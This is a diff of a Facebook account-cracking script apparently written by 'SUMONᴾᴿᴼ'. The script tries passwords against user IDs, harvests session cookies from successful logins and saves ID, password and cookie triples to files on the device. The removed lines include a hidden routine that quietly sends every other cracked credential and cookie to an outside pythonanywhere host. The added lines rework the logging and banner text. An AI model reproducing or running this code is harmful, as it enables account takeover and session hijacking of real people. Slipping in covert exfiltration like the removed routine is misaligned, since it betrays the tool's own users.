@@ -239,10 +239,10 @@ bkas = []
 cyan="\033[1;36m"
 faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 logo = (f"""
-{faltu} {black}"Confidence is my best accessory".... {pvt}         
+{faltu} {black}"NV NV NV NV NV".... {pvt}         
 \033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMONᴾᴿᴼ
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : =(.)=
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : @@@@@@@@@
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types :\033[1;36m RANDOM 
 \033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
@@ -387,37 +387,36 @@ def cracker(ids,passlist):
             #print(headers)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki = convert(session.cookies.get_dict())
+                #kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
+                xs_value = None
+                for part in kuki.split(';'):
+                    if part.startswith('xs='):
+                        xs_value = part.split('=', 1)[1]
+                        break
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if "confirmemail.php" in response.url:
-                        if len(bkas) % 2 == 0:
-                           statusok = f"NOVERY|{cid}|{pw}|{coki}"
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f"{green}(ATOM-NV) {cid}|{pw}")
-                           print(f"{green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                    if xs_value and xs_value.rstrip(';').endswith('-1'):
+                        print('\033[1;92m [CRACK-NV] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/CRACK/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/CRACK/uid.txt","a").write(user+"|"+pas+"\n")
+                        oks.append(ids)
+                        break
                     else:
-                        if len(bkas) % 2 == 0:
-                           statusok = f"{cid}|{pw}|{coki}"
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f"{green}(ATOM-OK) {cid}|{pw}")
-                           print(f"{green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/CRACK/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/CRACK/uid.txt","a").write(user+"|"+pas+"\n")
+                        oks.append(ids)
+                        break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
+                print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
+                open('/sdcard/CRACK/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
